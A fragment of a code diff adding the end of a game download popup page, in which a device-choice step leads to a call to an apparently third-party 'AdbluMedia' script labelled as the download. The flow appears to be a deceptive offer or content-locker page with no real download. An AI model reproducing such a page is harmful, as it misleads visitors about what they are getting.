+            buttons.forEach(btn => btn.classList.remove('active'));
+        }
+        
+        function closePopup() {
+            document.getElementById('gamePopup').style.display = 'none';
+        }
+        
+        function chooseDevice(device) {
+            selectedDevice = device;
+            // Update UI
+            const buttons = document.querySelectorAll('.choosed_device button');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            
+            if (device === 'ios') {
+                buttons[0].classList.add('active');
+            } else {
+                buttons[1].classList.add('active');
+            }
+        }
+        
+        function startDownload() {
+            if (!selectedDevice) {
+                alert("Please select your device first!");
+                return;
+            }
+            
+            // Execute AdbluMedia script
+            if (typeof _ET === 'function') {
+                _ET();
+                setTimeout(_ET, 5000);
+            } else {
+                alert("Download service is currently unavailable. Please try again later.");
+            }
+        }
+        
+        // Close popup when clicking outside
+        document.getElementById('gamePopup').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closePopup();
+            }
+        });
+    </script>
+</body>
+</html>
